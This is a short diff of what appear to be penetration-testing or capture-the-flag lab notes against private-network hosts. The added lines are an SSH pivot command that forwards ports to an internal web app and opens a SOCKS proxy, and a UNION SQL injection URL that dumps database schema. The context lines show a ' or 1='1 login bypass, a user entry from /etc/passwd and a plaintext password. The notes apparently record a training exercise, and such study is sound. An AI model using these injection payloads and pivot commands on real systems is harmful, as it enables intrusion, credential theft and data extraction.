@@ -539,8 +539,8 @@ http://127.0.0.1:1113/admin.html >> ' or 1='1 >>
 system_user=user2            user2:x:1002:1003::/home/user2:/bin/sh
 user_password=TurkeyDay24
 found 192.168.28.175 BestWebApp 2222 ssh 8000 html
-
-
+ssh www-data@10.50.11.158 -L 1111:192.168.28.175:2222 -L 1112:192.168.28.175:8000 -D 9050
+http://127.0.0.1:1112/pick.php?product=7 UNION SELECT table_schema,column_name,table_name from information_schema.columns #
 
 
 
